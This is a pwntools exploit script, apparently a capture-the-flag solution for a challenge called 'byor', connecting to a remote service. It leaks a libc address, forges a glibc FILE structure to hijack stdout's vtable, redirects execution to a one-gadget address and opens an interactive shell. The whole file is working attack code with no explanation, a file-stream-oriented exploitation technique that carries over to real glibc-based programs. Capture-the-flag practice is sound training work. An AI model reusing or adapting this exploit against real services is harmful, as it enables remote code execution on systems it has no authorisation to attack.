# type: ignore
from pwn import *

context.terminal = ['tmux', 'new-window']

def ROR(data, shift, size=64):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].rjust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

# p = process("./byor")
p = remote("flu.xxx", "11801")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

# b *save_for_backup+309
# gdb.attach(p, gdbscript='''
# b *save_for_backup+309
# ''')

p.recvuntil("foundation: ")
libc_base = int(b"0x" + p.recvline().replace(b"\n", b""), 16) - libc.symbols['_IO_2_1_stdout_']
print(hex(libc_base))

overwrite_ptr = 0x219000 + 0x98
what = libc_base + 0xebcf1
# libc_base + libc.symbols['system']

FSOP = FSOP_struct(flags = 0xfbad1000, \
        _IO_read_ptr    = libc_base + libc.symbols['_IO_2_1_stdout_'] + 0xb8 + 0x10, \
        _IO_read_base   = libc_base + libc.symbols['_IO_2_1_stdout_'] + 0xb8, \
        _IO_save_base   = libc_base + overwrite_ptr, \
        _IO_save_end    = libc_base + overwrite_ptr + 0x10, \
        _markers        = libc_base + libc.symbols['_IO_2_1_stdout_'] + 0x10, \
        lock            = libc_base + libc.symbols['_IO_2_1_stdout_'] + 0x1000, \
        __pad5          = what, \
        vtable          = libc_base + libc.symbols['_IO_file_jumps'] + 0x30 - 0x38)

print(len(FSOP))
p.sendline(FSOP)

p.interactive()